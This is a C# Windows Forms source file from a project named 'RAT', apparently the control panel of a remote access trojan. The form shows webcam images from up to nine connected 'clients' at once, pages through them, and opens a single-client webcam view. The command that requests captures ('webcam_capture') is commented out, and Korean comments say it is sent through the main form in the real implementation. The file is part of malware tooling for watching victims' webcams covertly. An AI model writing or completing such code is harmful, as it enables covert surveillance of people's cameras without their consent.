using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using System.Threading.Tasks;
using Newtonsoft.Json;
using RAT.Shared.Models;

namespace RAT.ControlPanel.Forms
{
    public partial class frmMultiWebcam : Form
    {
        private List<ClientInfo> clients;
        private MainForm mainForm;
        private int currentPage = 1;
        private const int GRID_SIZE = 9; // 3x3
        private PictureBox[] pictureBoxes;
        private Dictionary<string, Image> lastWebcamImages;
        
        public frmMultiWebcam(List<ClientInfo> clients, MainForm mainForm)
        {
            this.clients = clients;
            this.mainForm = mainForm;
            this.lastWebcamImages = new Dictionary<string, Image>();
            InitializeComponent();
            this.Text = $"Multi Webcam - {clients.Count} Clients";
        }
        
        private void frmMultiWebcam_Load(object sender, EventArgs e)
        {
            SetupGrid();
            UpdatePageLabel();
        }
        
        private void SetupGrid()
        {
            pictureBoxes = new PictureBox[GRID_SIZE];
            
            for (int i = 0; i < 3; i++)
            {
                for (int j = 0; j < 3; j++)
                {
                    int index = i * 3 + j;
                    var pb = new PictureBox
                    {
                        Dock = DockStyle.Fill,
                        BackColor = Color.Black,
                        SizeMode = PictureBoxSizeMode.Zoom,
                        Tag = index,
                        BorderStyle = BorderStyle.FixedSingle
                    };
                    
                    pb.DoubleClick += PictureBox_DoubleClick;
                    tableLayoutPanel.Controls.Add(pb, j, i);
                    pictureBoxes[index] = pb;
                }
            }
            
            ClearAllImages();
        }
        
        private void ClearAllImages()
        {
            foreach (var pb in pictureBoxes)
            {
                pb.Image = CreateNoSignalImage();
            }
        }
        
        private Image CreateNoSignalImage()
        {
            var bmp = new Bitmap(320, 240);
            using (var g = Graphics.FromImage(bmp))
            {
                g.Clear(Color.Black);
                g.DrawString("No Webcam", new Font("Segoe UI", 16, FontStyle.Bold), Brushes.White, new PointF(90, 100));
            }
            return bmp;
        }
        
        private void PictureBox_DoubleClick(object sender, EventArgs e)
        {
            var pb = sender as PictureBox;
            if (pb?.Tag == null) return;
            
            int index = (int)pb.Tag;
            int clientIndex = (currentPage - 1) * GRID_SIZE + index;
            
            if (clientIndex < clients.Count)
            {
                var client = clients[clientIndex];
                var form = new frmWebcam(client, mainForm);
                form.Show();
            }
        }
        
        private void btnStart_Click(object sender, EventArgs e)
        {
            timerRefresh.Start();
            btnStart.Enabled = false;
            btnStop.Enabled = true;
            RequestSnapshots();
        }
        
        private void btnStop_Click(object sender, EventArgs e)
        {
            timerRefresh.Stop();
            btnStart.Enabled = true;
            btnStop.Enabled = false;
        }
        
        private void btnSnapshot_Click(object sender, EventArgs e)
        {
            RequestSnapshots();
        }
        
        private async void RequestSnapshots()
        {
            int startIndex = (currentPage - 1) * GRID_SIZE;
            
            for (int i = 0; i < GRID_SIZE && startIndex + i < clients.Count; i++)
            {
                var client = clients[startIndex + i];
                
                // 명령 전송 (실제 구현에서는 mainForm을 통해 전송)
                // await SendCommand(client, new { type = "webcam_capture", device = 0 });
            }
            
            await Task.CompletedTask;
        }
        
        private async void timerRefresh_Tick(object sender, EventArgs e)
        {
            await UpdateWebcamImages();
        }
        
        private async Task UpdateWebcamImages()
        {
            int startIndex = (currentPage - 1) * GRID_SIZE;
            
            for (int i = 0; i < GRID_SIZE && startIndex + i < clients.Count; i++)
            {
                var client = clients[startIndex + i];
                
                // 마지막 웹캠 이미지 표시
                if (lastWebcamImages.ContainsKey(client.ClientId))
                {
                    pictureBoxes[i].Image = lastWebcamImages[client.ClientId];
                }
            }
            
            await Task.CompletedTask;
        }
        
        public void UpdateWebcamImage(string clientId, Image image)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => UpdateWebcamImage(clientId, image)));
                return;
            }
            
            lastWebcamImages[clientId] = image;
            
            // 현재 페이지에 표시 중인 클라이언트인지 확인
            int startIndex = (currentPage - 1) * GRID_SIZE;
            for (int i = 0; i < GRID_SIZE && startIndex + i < clients.Count; i++)
            {
                if (clients[startIndex + i].ClientId == clientId)
                {
                    pictureBoxes[i].Image = image;
                    break;
                }
            }
        }
        
        private void btnPrevious_Click(object sender, EventArgs e)
        {
            if (currentPage > 1)
            {
                ClearAllImages();
                currentPage--;
                UpdatePageLabel();
            }
        }
        
        private void btnNext_Click(object sender, EventArgs e)
        {
            int maxPage = (int)Math.Ceiling((double)clients.Count / GRID_SIZE);
            if (currentPage < maxPage)
            {
                ClearAllImages();
                currentPage++;
                UpdatePageLabel();
            }
        }
        
        private void UpdatePageLabel()
        {
            int maxPage = (int)Math.Ceiling((double)clients.Count / GRID_SIZE);
            lblPage.Text = $"Page {currentPage}/{maxPage}";
        }
        
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            timerRefresh?.Stop();
            base.OnFormClosing(e);
        }
    }
}
